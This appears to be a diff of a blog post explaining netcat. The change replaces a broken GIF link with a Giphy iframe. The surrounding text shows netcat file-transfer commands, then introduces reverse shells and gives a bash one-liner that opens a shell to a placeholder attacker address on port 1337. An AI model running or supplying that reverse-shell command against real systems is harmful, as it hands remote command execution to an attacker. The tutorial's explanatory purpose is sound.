@@ -24,9 +24,8 @@ On the remote: nc -lvnp 31000 127.0.0.1 > file
 On the local: nc -v -w 2 127.0.0.1 31000 < file
 
 	Clearly this is an extremely versatile and useful tool for diagnosing problems on a network. However beyond that, nc is also a favorite tool of hackers, known to some as  “the swiss army knife of hacking tools”. From the examples above, even successfully sending an encrypted file has obvious hacking applications. However, in order for the file to be opened on the remote, someone needs to be on the receiving end typing in the command. Or do they? 
-	
-	![](http://giphy.com/gifs/rick-and-morty-1107IdxsMU7I6khttp://)
-	
+
+<iframe src="//giphy.com/embed/1107IdxsMU7I6k" width="480" height="269" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="http://giphy.com/gifs/rick-and-morty-1107IdxsMU7I6k">via GIPHY</a></p>
 	
 	
 	One tricky thing that nc can be used to do is to create a reverse shell to remotely execute commands over any open port using netcat or BASH. A reverse shell is a type of shell in which another ‘attacking’ machine can execute commands. You can create one with a single line of code : bash -i >& /dev/tcp/youripaddress/1337 0>&1
